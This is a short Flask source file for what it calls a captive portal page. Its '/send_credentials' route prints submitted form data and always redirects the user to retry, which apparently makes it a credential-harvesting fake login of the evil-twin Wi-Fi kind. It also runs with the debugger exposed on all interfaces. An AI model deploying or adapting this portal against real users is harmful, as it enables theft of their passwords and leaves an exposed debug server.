from flask import Flask, render_template, request, redirect
from os.path import abspath, join as joinpath

# Static directory
STATIC_DIR     = abspath("src/static/")
# HTML directory
TEMPLATES_DIR  = joinpath(STATIC_DIR, "html")

app = Flask(__name__, template_folder=TEMPLATES_DIR, static_folder=STATIC_DIR)

@app.route('/')
def index():
    retry = request.args.get('r', type = bool)
    
    # Render a simple HTML template for the captive portal page
    return render_template("index.html", retry=retry)

@app.post('/send_credentials')
def send_credentials():
    data = request.form
    print(data)
    return redirect("/?r=true")

@app.errorhandler(404)
def page_not_found(error):
    return render_template("404.html"), 404

if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=True)
